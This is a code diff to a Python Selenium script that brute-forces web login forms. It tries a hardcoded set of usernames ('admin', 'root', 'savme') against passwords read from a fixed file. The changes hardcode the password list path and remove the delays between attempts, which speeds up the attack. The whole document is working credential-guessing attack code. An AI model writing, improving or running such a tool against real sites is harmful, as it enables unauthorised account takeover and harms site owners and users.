@@ -39,7 +39,7 @@ now = datetime.datetime.now()
 parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
 parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
 parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
-parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
+#parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
 parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
 
@@ -74,15 +74,14 @@ def wizard():
     password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
     login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
     #username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
+    #pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     #brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
     #brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website)
-    brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
+    brutes(username_selector ,password_selector,login_btn_selector, website)
 
 #def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
 #def brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website):
-def brutes(username_selector ,password_selector,login_btn_selector,pass_list, website):
-    f = open(pass_list, 'r')
+def brutes(username_selector ,password_selector,login_btn_selector,website):
     driver = webdriver.Chrome(CHROME_DVR_DIR)
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
@@ -92,9 +91,10 @@ def brutes(username_selector ,password_selector,login_btn_selector,pass_list, we
     while True:
         try:
             for username in ['admin', 'root', 'savme', 'Savme']:
+                f = open('/.passlist.txt', 'r')
                 for line in f:
                     browser.get(website)
-                    t.sleep(2)
+                    #t.sleep(2)
                     #Sel_double = browser.find_element_by_css_selector(double_selector) #Finds Selector
                     #actionChains = ActionChains(browser)
                     #actionChains.double_click(Sel_double).perform()
@@ -105,7 +105,7 @@ def brutes(username_selector ,password_selector,login_btn_selector,pass_list, we
                     # browser.find_element_by_css_selector(username_selector).clear()
                     Sel_user.send_keys(username)
                     Sel_pas.send_keys(line)
-                    t.sleep(5)
+                    #t.sleep(5)
                     print '------------------------'
                     print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                     print '------------------------'
@@ -143,9 +143,9 @@ count = 1 #count
 if options.usernamesel == None:
     if options.passsel == None:
         if options.loginsel == None:
-            if options.passlist == None:
-                if options.website == None:
-                    wizard()
+            #if options.passlist == None:
+            if options.website == None:
+                wizard()
 
 
 #username = options.username
@@ -154,8 +154,8 @@ username_selector = options.usernamesel
 password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
-pass_list = options.passlist
+#pass_list = options.passlist
 print banner
 #brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 #brutes(double_selector, username_selector ,password_selector,login_btn_selector,pass_list, website)
-brutes(username_selector ,password_selector,login_btn_selector,pass_list, website)
+brutes(username_selector ,password_selector,login_btn_selector, website)
